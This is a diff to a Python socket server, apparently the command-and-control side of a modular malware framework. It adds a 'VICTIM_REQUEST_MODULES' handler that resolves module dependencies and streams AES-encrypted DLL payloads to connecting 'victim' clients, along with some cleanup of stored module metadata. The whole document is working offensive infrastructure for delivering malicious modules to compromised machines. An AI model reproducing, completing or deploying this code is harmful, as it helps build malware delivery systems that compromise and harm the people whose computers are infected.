@@ -221,9 +221,9 @@ def HandleClient(clientSocket : socket.socket):
                     username,
                     os.path.join(MODULE_STORAGE, str(newModuleID) + ".dll"),
                     1,
-                    moduleDescription,
+                    moduleDescription.replace("_", " "),
                     datetime.now(timezone.utc).strftime("%Y-%m-%d-%H-%M-%S"),
-                    dependencies
+                    dependencies.replace('"', "") if (dependencies not in ['""', '"', '" "', r'"\"\""']) else "None"
                 ))
                 conn.commit()
             
@@ -430,8 +430,70 @@ def HandleClient(clientSocket : socket.socket):
                 response = aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), response, None).ljust(8192, b"\0")
                 clientSocket.send(response)
                 seedNonceIncrement += 1
+    elif(requestType == "VICTIM_REQUEST_MODULES"):
+        modules = json.loads(aes.decrypt(IncrementNonce(seedNonce, 1), base64.b64decode(request["Modules"]), None).decode())
+        
+        #Finding how many modules we need 
+        modulesProcessed = set()
+        
+        #Breadth first search please help me
+        queue = list(modules)
+        while(len(queue) > 0):
+            item = queue.pop(0)
+            modulesProcessed.add(int(item))
+            cursor.execute("SELECT dependencies FROM modules WHERE moduleID = ?", (item, ))
+            row = cursor.fetchone()
+            if row is None:
+                continue
 
+            dependenciesStr = row[0]
 
+            if dependenciesStr and dependenciesStr != "None":
+                dependencies = [d.strip() for d in dependenciesStr.split(",")]
+
+                for dependency in dependencies:
+                    if dependency not in modulesProcessed:
+                        queue.append(dependency)
+        
+        modulesProcessedList = list(modulesProcessed)
+        print(f"Modules Processed List : {modulesProcessedList}")
+        
+        #Transmitting the size information
+        modulesSizeDict = dict()
+        
+        for module in modulesProcessedList:
+            cursor.execute("SELECT moduleDLLPath FROM modules WHERE moduleID = ?", (module, ))
+            row = cursor.fetchone()
+            if row is None:
+                continue
+
+            dllPath = row[0]
+            size = os.path.getsize(dllPath)
+            modulesSizeDict[module] = size
+
+        transmissionRaw = json.dumps(modulesSizeDict)
+        transmission = aes.encrypt(IncrementNonce(seedNonce, 2), transmissionRaw.encode(), None)
+        clientSocket.send(transmission.ljust(2048, b"\0"))
+        
+        seedNonceIncrement = 3
+        for module in modulesProcessedList:
+            amountToSend = os.path.getsize(os.path.join(MODULE_STORAGE, str(module) + ".dll"))
+            
+            with open(os.path.join(MODULE_STORAGE, str(module) + ".dll"), "rb") as f:
+                while(amountToSend > 0):
+                    chunk = f.read(min(amountToSend, 65536))
+
+                    #print(int.from_bytes(seedNonce))
+
+                    #print(len(aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), chunk, None)))
+                    
+                    clientSocket.send(aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), chunk, None))
+                    amountToSend -= min(amountToSend, 65536)
+                    seedNonceIncrement += 1
+        
+        clientSocket.shutdown(socket.SHUT_RDWR)
+        clientSocket.close()
+        
 #Accept users
 incomingConnectionSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 incomingConnectionSocket.bind((INCOMING_CONNECTION_HOST, INCOMING_CONNECTION_PORT))
